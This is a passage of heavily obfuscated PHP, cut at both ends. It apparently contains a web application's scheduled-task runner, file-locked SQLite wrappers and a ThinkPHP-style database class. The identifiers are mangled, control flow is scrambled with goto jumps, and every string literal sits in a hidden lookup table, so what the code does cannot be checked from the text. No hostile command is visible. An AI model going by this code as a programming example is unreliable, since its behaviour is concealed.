$fº²ËÙ¦[83]) { $C¡Â»Ã¥†½ = self::valueGet($fº²ËÙ¦[1366]); if (time() - $C¡Â»Ã¥†½ > 3600 * 2) { self::restart(); } return; } goto CÇ·éîçĞ¤; CÇ·éîçĞ¤: http_close(); self::valueSet($fº²ËÙ¦[1365], $fº²ËÙ¦[83]); Hook::bind($fº²ËÙ¦[1367], $fº²ËÙ¦[1368]); goto F¥–¢ïæ ¹; F¥–¢ïæ ¹: while (!0) { self::cacheClear(); if (self::valueGet($fº²ËÙ¦[678]) != $fº²ËÙ¦[83]) { self::valueSet($fº²ËÙ¦[1365], $fº²ËÙ¦[464]); self::log($fº²ËÙ¦[1369]); die; } self::valueSet($fº²ËÙ¦[1365], $fº²ËÙ¦[83]); self::valueSet($fº²ËÙ¦[1366], time()); self::taskRunAll(); sleep(self::valueGet($fº²ËÙ¦[1370])); } goto AÀˆ¨ÊîÚ; AÀˆ¨ÊîÚ: } public static function restart() { $c™³ƒ«£ª =& $_SERVER[£ü]; http_close(); self::valueSet($c™³ƒ«£ª[678], $c™³ƒ«£ª[464]); sleep(self::valueGet($c™³ƒ«£ª[1370]) + 5); self::valueSet($c™³ƒ«£ª[1365], $c™³ƒ«£ª[464]); self::valueSet($c™³ƒ«£ª[678], $c™³ƒ«£ª[83]); } public static function shutdownEvent() { $DÏÙ‡ä†† =& $_SERVER[£ü]; self::valueSet($DÏÙ‡ä††[1365], $DÏÙ‡ä††[464]); self::log($DÏÙ‡ä††[1371]); } public static function config($EŒ³ĞëÆØ, $b«ÏŠõ½Æí) { $cé²ª¦‹Ìí =& $_SERVER[£ü]; $Cº†¼ãñ»ğ = 20; $b«ÏŠõ½Æí = intval($b«ÏŠõ½Æí) <= $Cº†¼ãñ»ğ ? $Cº†¼ãñ»ğ : intval($b«ÏŠõ½Æí); self::valueSet($cé²ª¦‹Ìí[678], $EŒ³ĞëÆØ); self::valueSet($cé²ª¦‹Ìí[1370], $b«ÏŠõ½Æí); } private static function taskRunAll() { $døå‡ô„íï =& $_SERVER[£ü]; $cù£Œğæñ = Model($døå‡ô„íï[1372])->listData(); $E¥¦âñğ¥ò = count($cù£Œğæñ); for ($CŞà¿•¡ = 0; $CŞà¿•¡ < $E¥¦âñğ¥ò; $CŞà¿•¡++) { $BæŠØêíÖ = $cù£Œğæñ[$CŞà¿•¡]; if ($BæŠØêíÖ[$døå‡ô„íï[1373]] != $døå‡ô„íï[83]) { continue; } if (!self::taskTimeCheck($BæŠØêíÖ)) { continue; } self::taskRun($BæŠØêíÖ); } Hook::trigger($døå‡ô„íï[1374]); } private static function taskTimeCheck($b®¿Õ¬Ë¾¡) { goto eË‰ÍÛ°ß; fåß™“öÒÄ: $A“íóôçÕ = strtotime($bÏ¨£µç²Ÿ[1375] . $BµĞµÎ‚à[$bÏ¨£µç²Ÿ[1376]] . $bÏ¨£µç²Ÿ[1377]) - strtotime($bÏ¨£µç²Ÿ[1378]); $aíå™’ğ¬ = time() - strtotime(date($bÏ¨£µç²Ÿ[1379]) . $bÏ¨£µç²Ÿ[1380]); $FÈÑøŞŒÆÓ = $aíå™’ğ¬ >= $A“íóôçÕ && $aíå™’ğ¬ <= $A“íóôçÕ + 3600; goto d»ƒ–óŠ­Ñ; eË‰ÍÛ°ß: $bÏ¨£µç²Ÿ =& $_SERVER[£ü]; $BµĞµÎ‚à = json_decode($b®¿Õ¬Ë¾¡[$bÏ¨£µç²Ÿ[187]], !0); $DÇÆËóö¼º = intval($b®¿Õ¬Ë¾¡[$bÏ¨£µç²Ÿ[1366]]); goto fåß™“öÒÄ; d»ƒ–óŠ­Ñ: switch ($BµĞµÎ‚à[$bÏ¨£µç²Ÿ[29]]) { case $bÏ¨£µç²Ÿ[1381]: if (time() - $DÇÆËóö¼º < 3600 * 24 * 30) { return !1; } if ($BµĞµÎ‚à[$bÏ¨£µç²Ÿ[1381]] == date($bÏ¨£µç²Ÿ[1382]) && $FÈÑøŞŒÆÓ) { return !0; } break; case $bÏ¨£µç²Ÿ[1383]: if (time() - $DÇÆËóö¼º < 3600 * 24 * 7) { return !1; } $FÔ±ÊŒíÕà = date($bÏ¨£µç²Ÿ[1384]) == 0 ? 7 : date($bÏ¨£µç²Ÿ[1384]); if ($BµĞµÎ‚à[$bÏ¨£µç²Ÿ[1383]] == $FÔ±ÊŒíÕà && $FÈÑøŞŒÆÓ) { return !0; } break; case $bÏ¨£µç²Ÿ[1376]: if (time() - $DÇÆËóö¼º < 3600 * 24) { return !1; } if ($FÈÑøŞŒÆÓ) { return !0; } break; case $bÏ¨£µç²Ÿ[1385]: if (time() - $DÇÆËóö¼º >= floatval($BµĞµÎ‚à[$bÏ¨£µç²Ÿ[1385]]) * 60) { return !0; } break; default: break; } return !1; goto EÌÖŸÂ„¦ì; EÌÖŸÂ„¦ì: } public static function taskRun($E÷Øç²à˜÷) { goto eñªñ±½º‹; eñªñ±½º‹: $fŒ¦¸·Š‹Â =& $_SERVER[£ü]; self::log($fŒ¦¸·Š‹Â[1386] . $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[364]] . $fŒ¦¸·Š‹Â[1387] . $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[28]] . $fŒ¦¸·Š‹Â[1388] . $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[1389]]); Model($fŒ¦¸·Š‹Â[1372])->run($E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[364]]); goto Câì…¢; bï¯ëÙ˜ï: Model($fŒ¦¸·Š‹Â[1390])->add(array($fŒ¦¸·Š‹Â[1391] => $fŒ¦¸·Š‹Â[33], $fŒ¦¸·Š‹Â[1392] => $fŒ¦¸·Š‹Â[464], $fŒ¦¸·Š‹Â[29] => $fŒ¦¸·Š‹Â[1393] . $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[364]], $fŒ¦¸·Š‹Â[1394] => json_encode(array($fŒ¦¸·Š‹Â[28] => $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[28]], $fŒ¦¸·Š‹Â[1395] => timeFloat() - $EÏøŞŒ‹æ, $fŒ¦¸·Š‹Â[278] => $D†–ò…ñÉ’)))); self::log($fŒ¦¸·Š‹Â[1396] . $E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[364]] . $fŒ¦¸·Š‹Â[1397] . $D†–ò…ñÉ’); return !0; goto EÙîÓ Ê´²; Câì…¢: $EÏøŞŒ‹æ = timeFloat(); $D†–ò…ñÉ’ = $fŒ¦¸·Š‹Â[33]; switch ($E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[29]]) { case $fŒ¦¸·Š‹Â[292]: $EÃÓßÀàèœ = url_request($E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[1389]], $fŒ¦¸·Š‹Â[213], !1, !1, !1, !1, 5); $D†–ò…ñÉ’ = strlen($EÃÓßÀàèœ); break; case $fŒ¦¸·Š‹Â[212]: $D†–ò…ñÉ’ = Hook::apply($E÷Øç²à˜÷[$fŒ¦¸·Š‹Â[1389]]); default: break; } goto bï¯ëÙ˜ï; EÙîÓ Ê´²: } private static function valueGet($f¼¸Ü±ƒ²´) { $FÍİ°»ËÚ =& $_SERVER[£ü]; $cÁ„°ÙÏñ¤ = $FÍİ°»ËÚ[1398]; $AĞ¸’„í§ = Model($FÍİ°»ËÚ[1399])->get($f¼¸Ü±ƒ²´, $cÁ„°ÙÏñ¤); if (is_null($AĞ¸’„í§)) { Model($FÍİ°»ËÚ[1399])->set($FÍİ°»ËÚ[1370], 10, $cÁ„°ÙÏñ¤); Model($FÍİ°»ËÚ[1399])->set($FÍİ°»ËÚ[678], $FÍİ°»ËÚ[83], $cÁ„°ÙÏñ¤); Model($FÍİ°»ËÚ[1399])->set($FÍİ°»ËÚ[1365], $FÍİ°»ËÚ[464], $cÁ„°ÙÏñ¤); $AĞ¸’„í§ = Model($FÍİ°»ËÚ[1399])->get($f¼¸Ü±ƒ²´, $cÁ„°ÙÏñ¤); } return $AĞ¸’„í§; } private static function valueSet($A›±˜‘ÈØ¢, $f¨¯òÏ‡Ğ±) { $cÓØ´š²í– =& $_SERVER[£ü]; return Model($cÓØ´š²í–[1399])->set($A›±˜‘ÈØ¢, $f¨¯òÏ‡Ğ±, $cÓØ´š²í–[1398]); } protected static function log($b‰ßñƒ…é“) { write_log($b‰ßñƒ…é“, $_SERVER[£ü][1400]); } private static function cacheClear() { $eóÉğ½ĞÓÍ =& $_SERVER[£ü]; $aÜ½È¨è‰« = Model($eóÉğ½ĞÓÍ[1399])->cacheKey($eóÉğ½ĞÓÍ[1398]); Cache::clearMemory($aÜ½È¨è‰«); } } goto f¯¼ÆÃÏ–„; DÆÆÓ”Â: class DbSqlite extends DbSqliteBase { public function query($eË¸×šƒïÌ) { goto EÌ™®…ÀĞ; B»øâ°Ø¬É: if (!$eµ“÷¡…íÈ) { return !1; } if (flock($eµ“÷¡…íÈ, LOCK_EX)) { $e”±¡Ï‰”Ó = parent::query($eË¸×šƒïÌ); flock($eµ“÷¡…íÈ, LOCK_UN); fclose($eµ“÷¡…íÈ); return $e”±¡Ï‰”Ó; } flock($eµ“÷¡…íÈ, LOCK_UN); goto EÇî«ŠÀ™£; EÌ™®…ÀĞ: $d£†œõ©®¹ =& $_SERVER[£ü]; $fËó‘«î«· = DATA_PATH . $d£†œõ©®¹[862]; $eµ“÷¡…íÈ = fopen($fËó‘«î«·, $d£†œõ©®¹[863]); goto B»øâ°Ø¬É; EÇî«ŠÀ™£: fclose($eµ“÷¡…íÈ); show_json($d£†œõ©®¹[864], !1); return !1; goto b¸´º–Ã“Ë; b¸´º–Ã“Ë: } public function execute($e‘½Œ´… å) { goto B¿ß Î‡—ì; c•çù£ä¼Š: if (!$eÃ”ãÌÎ) { return !1; } if (flock($eÃ”ãÌÎ, LOCK_EX)) { $dÄİö¨ƒœ = parent::execute($e‘½Œ´… å); flock($eÃ”ãÌÎ, LOCK_UN); fclose($eÃ”ãÌÎ); return $dÄİö¨ƒœ; } flock($eÃ”ãÌÎ, LOCK_UN); goto eÔ¿»“õˆ’; B¿ß Î‡—ì: $BÏÓî‚÷® =& $_SERVER[£ü]; $E¶ÛçŠçƒ = DATA_PATH . $BÏÓî‚÷®[862]; $eÃ”ãÌÎ = fopen($E¶ÛçŠçƒ, $BÏÓî‚÷®[863]); goto c•çù£ä¼Š; eÔ¿»“õˆ’: fclose($eÃ”ãÌÎ); show_json($BÏÓî‚÷®[864], !1); return !1; goto e›èÒ—§¬Ë; e›èÒ—§¬Ë: } } class DbSqlite3 extends DbSqlite3Base { public function query($e­¾‘ÃÕ´) { goto C¹‰ùê¦Şê; aÍ…Ö×Îğ£: if (!$c˜ï˜‡ÕÈ) { return !1; } if (flock($c˜ï˜‡ÕÈ, LOCK_EX)) { $AâË¯ˆÔ = parent::query($e­¾‘ÃÕ´); flock($c˜ï˜‡ÕÈ, LOCK_UN); fclose($c˜ï˜‡ÕÈ); return $AâË¯ˆÔ; } flock($c˜ï˜‡ÕÈ, LOCK_UN); goto bÌ Î£Ğœä; C¹‰ùê¦Şê: $bŠŠ²Ïİ³ =& $_SERVER[£ü]; $D¶ÕÌãÏ½¼ = DATA_PATH . $bŠŠ²Ïİ³[862]; $c˜ï˜‡ÕÈ = fopen($D¶ÕÌãÏ½¼, $bŠŠ²Ïİ³[863]); goto aÍ…Ö×Îğ£; bÌ Î£Ğœä: fclose($c˜ï˜‡ÕÈ); show_json($bŠŠ²Ïİ³[864], !1); return !1; goto d¯º‚³æµ“; d¯º‚³æµ“: } public function execute($fğ³¦ˆçĞô) { goto eš‘¢¾ÙÆ­; EÈ„ÍÂß¤“: if (!$D´–Ãã÷È) { return !1; } if (flock($D´–Ãã÷È, LOCK_EX)) { $FÜ£©º = parent::execute($fğ³¦ˆçĞô); flock($D´–Ãã÷È, LOCK_UN); fclose($D´–Ãã÷È); return $FÜ£©º; } flock($D´–Ãã÷È, LOCK_UN); goto A„¡ÖÌ© µ; eš‘¢¾ÙÆ­: $bË†ÂÔÂÂœ =& $_SERVER[£ü]; $DŸ¡äĞ“„Í = DATA_PATH . $bË†ÂÔÂÂœ[862]; $D´–Ãã÷È = fopen($DŸ¡äĞ“„Í, $bË†ÂÔÂÂœ[863]); goto EÈ„ÍÂß¤“; A„¡ÖÌ© µ: fclose($D´–Ãã÷È); show_json($bË†ÂÔÂÂœ[864], !1); return !1; goto cì÷ãÇÛ„§; cì÷ãÇÛ„§: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\156\145\161" => "\74\76", "\147\164" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\74\75", "\156\157\x74\154\151\x6b\x65" => "\116\x4f\x54\40\x4c\x49\113\x45", "\x6c\151\x6b\145" => "\114\x49\113\105", "\x69\156" => "\x49\x4e", "\156\157\x74\x69\x6e" => "\x4e\x4f\124\40\x49\116", "\156\x6f\x74\x20\x69\x6e" => "\116\x4f\124\40\x49\116", "\142\145\x74\x77\x65\145\156" => "\x42\x45\124\x57\x45\105\116", "\156\x6f\x74\x62\145\164\x77\x65\145\156" => "\x4e\117\x54\x20\x42\105\124\x57\105\x45\x4e", "\156\x6f\x74\x20\x62\x65\x74\x77\x65\145\156" => "\x4e\117\124\x20\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\123\x45\x4c\x45\103\x54\x25\x44\x49\123\x54\111\116\103\124\45\40\x25\106\111\x45\x4c\104\x25\x20\x46\122\117\115\x20\45\x54\101\x42\x4c\105\x25\x25\x4a\117\x49\x4e\x25\x25\127\x48\105\x52\105\45\45\x47\x52\x4f\125\x50\x25\x25\110\101\126\x49\116\x47\45\45\x4f\x52\104\x45\122\x25\45\x4c\111\x4d\x49\124\45\x20\45\125\116\x49\117\116\45\45\x43\117\x4d\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $fÂ‘â­°ë = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[£ü][865], $fÂ‘â­°ë); } public function factory($CÊ„§Ï‰öè = '') { goto d”ĞãÛÜ˜Ğ; d”ĞãÛÜ˜Ğ: $bÇÀÁÕÃ =& $_SERVER[£ü]; $CÊ„§Ï‰öè = $this->parseConfig($CÊ„§Ï‰öè); if (empty($CÊ„§Ï‰öè[$bÇÀÁÕÃ[866]])) { think_exception(think_lang($bÇÀÁÕÃ[867])); } goto BééÃŒ¨©Â; AÒ¡ºŠ“«¶: return $dÁÃ®ë¾î; goto c‰‡È†®íÅ; BééÃŒ¨©Â: $this->dbType = ucwords(strtolower($CÊ„§Ï‰öè[$bÇÀÁÕÃ[866]])); $d„ø‘ãîğ“ = $bÇÀÁÕÃ[868] . $this->dbType; if (class_exists($d„ø‘ãîğ“)) { $dÁÃ®ë¾î = new $d„ø‘ãîğ“($CÊ„§Ï‰öè); if ($bÇÀÁÕÃ[713] != strtolower($CÊ„§Ï‰öè[$bÇÀÁÕÃ[866]])) { $dÁÃ®ë¾î->dbType = strtoupper($this->dbType); } else { $dÁÃ®ë¾î->dbType = $this->_getDsnType($CÊ„§Ï‰öè[$bÇÀÁÕÃ[818]]); } } else { think_exception(think_lang($bÇÀÁÕÃ[869]) . $bÇÀÁÕÃ[870] . $d„ø‘ãîğ“); } goto AÒ¡ºŠ“«¶; c‰‡È†®íÅ: } public function __call($FöòÕø„ƒ¬, $dÍåÉîëÂ) { if (method_exists($this, $FöòÕø„ƒ¬)) { return call_user_func_array(array($this, $FöòÕø„ƒ¬), $dÍåÉîëÂ); } } protected function _getDsnType($AÏƒ©¾‹ó) { $eÅ©ñËÒÍö = explode($_SERVER[£ü][4], $AÏƒ©¾‹ó); $d­ËäâĞ–± = strtoupper(trim($eÅ©ñËÒÍö[0])); return $d­ËäâĞ–±; } private function parseConfig($bÏÜÒ‘³ë… = '') { $d …ˆé²Ê‚ =& $_SERVER[£ü]; if (!empty($bÏÜÒ‘³ë…) && is_string($bÏÜÒ‘³ë…)) { $bÏÜÒ‘³ë… = $this->parseDSN($bÏÜÒ‘³ë…); } elseif (is_array($bÏÜÒ‘³ë…)) { $bÏÜÒ‘³ë… = array_change_key_case($bÏÜÒ‘³ë…); $bÏÜÒ‘³ë… = array($d …ˆé²Ê‚[866] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[712]], $d …ˆé²Ê‚[791] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[871]], $d …ˆé²Ê‚[792] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[872]], $d …ˆé²Ê‚[789] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[873]], $d …ˆé²Ê‚[790] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[874]], $d …ˆé²Ê‚[17] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[875]], $d …ˆé²Ê‚[818] => $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[714]], $d …ˆé²Ê‚[13] => isset($bÏÜÒ‘³ë…[$d …ˆé²Ê‚[876]]) ? $bÏÜÒ‘³ë…[$d …ˆé²Ê‚[876]] : array()); } elseif (empty($bÏÜÒ‘³ë…)) { if (think_config($d …ˆé²Ê‚[877]) && $d …ˆé²Ê‚[713] != strtolower(think_config($d …ˆé²Ê‚[878]))) { $bÏÜÒ‘³ë… = $this->parseDSN(think_config($d …ˆé²Ê‚[877])); } else { $bÏÜÒ‘³ë… = array($d …ˆé²Ê‚[866] => think_config($d …ˆé²Ê‚[878]), $d …ˆé²Ê‚[791] => think_config($d …ˆé²Ê‚[879]), $d …ˆé²Ê‚[792] => think_config($d …ˆé²Ê‚[880]), $d …ˆé²Ê‚[789] => think_config($d …ˆé²Ê‚[881]), $d …ˆé²Ê‚[790] => think_config($d …ˆé²Ê‚[882]), $d …ˆé²Ê‚[17] => think_config($d …ˆé²Ê‚[231]), $d …ˆé²Ê‚[818] => think_config($d …ˆé²Ê‚[877]), $d …ˆé²Ê‚[13] => think_config($d …ˆé²Ê‚[883])); } } return $bÏÜÒ‘³ë…; } protected function initConnect($B ‘«‰Àå = true) { if (1 == think_config($_SERVER[£ü][18])) { $this->_linkID = $this->multiConnect($B ‘«‰Àå); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($A‚„¿ÜÁ‘‡ = false) { $d“ã•„ïë‰ =& $_SERVER[£ü]; static $F¢¼ÍÌÄ‚ = array(); if (empty($F¢¼ÍÌÄ‚)) { foreach ($this->config as $c‘›–À¸´ => $c•«ïÔÆæ) { $F¢¼ÍÌÄ‚[$c‘›–À¸´] = explode($d“ã•„ïë‰[47], $c•«ïÔÆæ); } } if (think_config($d“ã•„ïë‰[884])) { if ($A‚„¿ÜÁ‘‡) { $aÓ‰ß…ÒÎÁ = floor(mt_rand(0, think_config($d“ã•„ïë‰[885]) - 1)); } else { if (is_numeric(think_config($d“ã•„ïë‰[886]))) { $aÓ‰ß…ÒÎÁ = think_config($d“ã•„ïë‰[886]); } else { $aÓ‰ß…ÒÎÁ = floor(mt_rand(think_config($d“ã•„ïë‰[885]), count($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[789]]) - 1)); } } } else { $aÓ‰ß…ÒÎÁ = floor(mt_rand(0, count($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[789]]) - 1)); } $b¡‚²îáîÊ = array($d“ã•„ïë‰[791] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[791]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[791]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[791]][0], $d“ã•„ïë‰[792] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[792]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[792]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[792]][0], $d“ã•„ïë‰[789] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[789]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[789]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[789]][0], $d“ã•„ïë‰[790] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[790]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[790]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[790]][0], $d“ã•„ïë‰[17] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[17]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[17]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[17]][0], $d“ã•„ïë‰[818] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[818]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[818]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[818]][0], $d“ã•„ïë‰[13] => isset($F¢¼ÍÌÄ‚[$d“ã•„ïë‰[13]][$aÓ‰ß…ÒÎÁ]) ? $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[13]][$aÓ‰ß…ÒÎÁ] : $F¢¼ÍÌÄ‚[$d“ã•„ïë‰[13]][0]); return $this->connect($b¡‚²îáîÊ, $aÓ‰ß…ÒÎÁ); } public function parseDSN($F™‹åæÓó) { $c÷á³¼Ì¯¶ =& $_SERVER[£ü]; if (empty($F™‹åæÓó)) { return !1; } $E‚ß‡Ê“Èï = parse_url($F™‹åæÓó); if ($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[165]]) { $f™ùİŠÆÉ = array($c÷á³¼Ì¯¶[866] => $E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[165]], $c÷á³¼Ì¯¶[791] => isset($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[531]]) ? $E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[531]] : $c÷á³¼Ì¯¶[33], $c÷á³¼Ì¯¶[792] => isset($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[887]]) ? $E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[887]] : $c÷á³¼Ì¯¶[33], $c÷á³¼Ì¯¶[789] => isset($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[166]]) ? $E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[166]] : $c÷á³¼Ì¯¶[33], $c÷á³¼Ì¯¶[790] => isset($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[167]]) ? $E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[167]] : $c÷á³¼Ì¯¶[33], $c÷á³¼Ì¯¶[17] => isset($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[75]]) ? substr($E‚ß‡Ê“Èï[$c÷á³¼Ì¯¶[75]], 1) : $c÷á³¼Ì¯¶[33]); } else { preg_match($c÷á³¼Ì¯¶[888], trim($F™‹åæÓó), $F¼Ï¡¬“á˜); $f™ùİŠÆÉ = array($c÷á³¼Ì¯¶[866] => $F¼Ï¡¬“á˜[1], $c÷á³¼Ì¯¶[791] => $F¼Ï¡¬“á˜[2], $c÷á³¼Ì¯¶[792] => $F¼Ï¡¬“á˜[3], $c÷á³¼Ì¯¶[789] => $F¼Ï¡¬“á˜[4], $c÷á³¼Ì¯¶[790] => $F¼Ï¡¬“á˜[5], $c÷á³¼Ì¯¶[17] => $F¼Ï¡¬“á˜[6]); } $f™ùİŠÆÉ[$c÷á³¼Ì¯¶[818]] = $c÷á³¼Ì¯¶[33]; return $f™ùİŠÆÉ; } protected function debug() { $c¼«ƒœ©Ü =& $_SERVER[£ü]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $c¼«ƒœ©Ü[889]; if (think_config($c¼«ƒœ©Ü[890])) { think_status($c¼«ƒœ©Ü[891]); think_trace($this->queryStr . $c¼«ƒœ©Ü[892] . think_status($c¼«ƒœ©Ü[20], $c¼«ƒœ©Ü[891], 6) . $c¼«ƒœ©Ü[893], $c¼«ƒœ©Ü[33], $c¼«ƒœ©Ü[894]); } } protected function parseLock($Bâã¨‹Å· = false) { $Cƒ³‹³æ» =& $_SERVER[£ü]; if (!$Bâã¨‹Å·) { return $Cƒ³‹³æ»[33]; } if ($Cƒ³‹³æ»[820] == $this->dbType) { return $Cƒ³‹³æ»[895]; } return $Cƒ³‹³æ»[896]; } protected function parseSet($béñ¶„²™) { $AËç‘¼ª× =& $_SERVER[£ü]; foreach ($béñ¶„²™ as $BÒÌÜºóÚÂ => $FŒ²¸Üë£Û) { if (is_array($FŒ²¸Üë£Û) && $AËç‘¼ª×[282] == $FŒ²¸Üë£Û[0]) { $aÖ½…İ”‚¢[] = $this->parseKey($BÒÌÜºóÚÂ) . $AËç‘¼ª×[897] . $FŒ²¸Üë£Û[1]; } elseif (is_scalar($FŒ²¸Üë£Û) || is_null($FŒ²¸Üë£Û)) { $aÖ½…İ”‚¢[] = $this->parseKey($BÒÌÜºóÚÂ) . $AËç‘¼ª×[897] . $this->parseValue($FŒ²¸Üë£Û); } } return $AËç‘¼ª×[898] . implode($AËç‘¼ª×[47], $aÖ½…İ”‚¢); } protected function bindParam($c™‹Š¼ç”, $A˜‡®ñøá) { $this->bind[$_SERVER[£ü][4] . $c™‹Š¼ç”] = $A˜‡®ñøá; } protected function parseBind($F‹èŒ¬Ã¡) { $F‹èŒ¬Ã¡ = array_merge($this->bind, $F‹èŒ¬Ã¡); $this->bind = array(); return $F‹èŒ¬Ã¡; } function parseKey(&$a¾•ëêÒ, $C³å ˆÍ‹Ü = true) { if ($C³å ˆÍ‹Ü) { $a¾•ëêÒ = $this->parseKeyCheck($a¾•ëêÒ); } return $a¾•ëêÒ; } function parseKeyCheck($CÀƒ­Ö„) { $dœ‚ö¼ç¸ =& $_SERVER[£ü]; $CÀƒ­Ö„ = trim($CÀƒ­Ö„); if (!preg_match($dœ‚ö¼ç¸[899], $CÀƒ­Ö„)) { think_exception($dœ‚ö¼ç¸[900] . $CÀƒ­Ö„); } return $CÀƒ­Ö„; } protected function parseValue($E¥…¥›”ß) { $FŞĞè»Ã¾Ì =& $_SERVER[£ü]; if (is_string($E¥…¥›”ß)) { $E¥…¥›”ß = $FŞĞè»Ã¾Ì[859] . $this->escapeString($E¥…¥›”ß) . $FŞĞè»Ã¾Ì[859]; } elseif (isset($E¥…¥›”ß[0]) && is_string($E¥…¥›”ß[0]) && strtolower($E¥…¥›”ß[0]) == $FŞĞè»Ã¾Ì[282]) { $E¥…¥›”ß = $this->escapeString($E¥…¥›”ß[1]); } elseif (is_array($E¥…¥›”ß)) { $E¥…¥›”ß = array_map(array($this, $FŞĞè»Ã¾Ì[860]), $E¥…¥›”ß); } elseif (is_bool($E¥…¥›”ß)) { $E¥…¥›”ß = $E¥…¥›”ß ? $FŞĞè»Ã¾Ì[83] : $FŞĞè»Ã¾Ì[464]; } elseif (is_null($E¥…¥›”ß)) { $E¥…¥›”ß = $FŞĞè»Ã¾Ì[101]; } return $E¥…¥›”ß; } protected function parseField($bÖ¨ÑÖƒá) { $aÙ±ìºª¢ª =& $_SERVER[£ü]; if (is_string($bÖ¨ÑÖƒá) && strpos($bÖ¨ÑÖƒá, $aÙ±ìºª¢ª[47])) { $bÖ¨ÑÖƒá = explode($aÙ±ìºª¢ª[47], $bÖ¨ÑÖƒá); } if (is_array($bÖ¨ÑÖƒá)) { $f¡„†›ØÉÁ = array(); foreach ($bÖ¨ÑÖƒá as $CƒÎ‹‘š÷ => $EÂ‚ñ†Éõ) { if (!is_numeric($CƒÎ‹‘š÷)) { $f¡„†›ØÉÁ[] = $this->parseKey($CƒÎ‹‘š÷) . $aÙ±ìºª¢ª[901] . $this->parseKey($EÂ‚ñ†Éõ); } else { $f¡„†›ØÉÁ[] = $this->parseKey($EÂ‚ñ†Éõ); } } $E£Â‰ÅŒà¼ = implode($aÙ±ìºª¢ª[47], $f¡„†›ØÉÁ); } elseif (is_string($bÖ¨ÑÖƒá) && !empty($bÖ¨ÑÖƒá)) { $E£Â‰ÅŒà¼ = $bÖ¨ÑÖƒá; } else { $E£Â‰ÅŒà¼ = $aÙ±ìºª¢ª[173]; } return $E£Â‰ÅŒà¼; } protected function parseTable($DÊø†×³ëÇ) { $c²ò»Ã“ÑŠ =& $_SERVER[£ü]; if (is_array($DÊø†×³ëÇ)) { $c–Ç”ƒ‰ÜÄ = array(); foreach ($DÊø†×³ëÇ as $AÖÒŠÆââ… => $Fš¸‰µƒªå) { if (!is_numeric($AÖÒŠÆââ…)) { $c–Ç”ƒ‰ÜÄ[] = $this->parseKey($AÖÒŠÆââ…) . $c²ò»Ã“ÑŠ[50] . $this->parseKey($Fš¸‰µƒªå); } else { $c–Ç”ƒ‰ÜÄ[] = $this->parseKey($AÖÒŠÆââ…); } } $DÊø†×³ëÇ = $c–Ç”ƒ‰ÜÄ; } elseif (is_string($DÊø†×³ëÇ)) { if (strstr($DÊø†×³ëÇ, $c²ò»Ã“ÑŠ[50])) { return $DÊø†×³ëÇ; } $DÊø†×³ëÇ = explode($c²ò»Ã“ÑŠ[47], $DÊø†×³ëÇ); 